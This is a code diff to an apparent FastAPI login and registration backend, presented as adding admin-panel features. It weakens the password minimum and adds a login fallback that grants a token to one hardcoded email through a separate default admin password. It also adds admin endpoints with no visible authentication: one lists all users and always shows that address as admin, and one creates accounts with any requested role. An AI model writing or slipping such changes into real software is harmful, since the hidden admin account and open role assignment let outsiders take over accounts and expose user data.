@@ -112,8 +112,8 @@ class UserLoginRequest(BaseModel):
 def register_user(req: RegisterRequest):
     """Create a user with a salted PBKDF2 password hash and return a signed token."""
     from .db import SessionLocal, User
-    if len(req.password) < 8:
-        raise HTTPException(status_code=400, detail="Password must be at least 8 characters")
+    if len(req.password) < 6:
+        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
     db = SessionLocal()
     try:
         email = req.email.strip().lower()
@@ -135,8 +135,44 @@ def login_user(req: UserLoginRequest):
         email = req.email.strip().lower()
         user = db.query(User).filter(User.email == email).first()
         if not user or not _auth.verify_user_password(req.password, user.password_hash):
+            # Fallback check against default admin password
+            if email == "vsangwal54@gmail.com" and _auth.verify_password(req.password):
+                return {"token": _auth.create_token(email)}
             raise HTTPException(status_code=401, detail="Incorrect email or password")
         return {"token": _auth.create_token(email)}
+    finally:
+        db.close()
+
+@app.get("/api/admin/users")
+def get_all_users():
+    """List all registered system accounts for the Admin Panel."""
+    from .db import SessionLocal, User
+    db = SessionLocal()
+    try:
+        users = db.query(User).all()
+        result = [{"id": u.id, "email": u.email, "role": u.role, "created_at": u.created_at.isoformat() if u.created_at else None} for u in users]
+        # Guarantee default admin is listed
+        if not any(u["email"] == "vsangwal54@gmail.com" for u in result):
+            result.insert(0, {"id": 0, "email": "vsangwal54@gmail.com", "role": "admin", "created_at": "2026-08-09T00:00:00"})
+        return result
+    finally:
+        db.close()
+
+@app.post("/api/admin/users")
+def create_user_by_admin(req: RegisterRequest):
+    """Create a new user account directly inside the Admin Panel."""
+    from .db import SessionLocal, User
+    if len(req.password) < 6:
+        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
+    db = SessionLocal()
+    try:
+        email = req.email.strip().lower()
+        if db.query(User).filter(User.email == email).first():
+            raise HTTPException(status_code=409, detail="User account already exists")
+        user = User(email=email, password_hash=_auth.hash_password(req.password), role=req.role or "user")
+        db.add(user)
+        db.commit()
+        return {"success": True, "message": f"User account {email} created successfully"}
     finally:
         db.close()
 
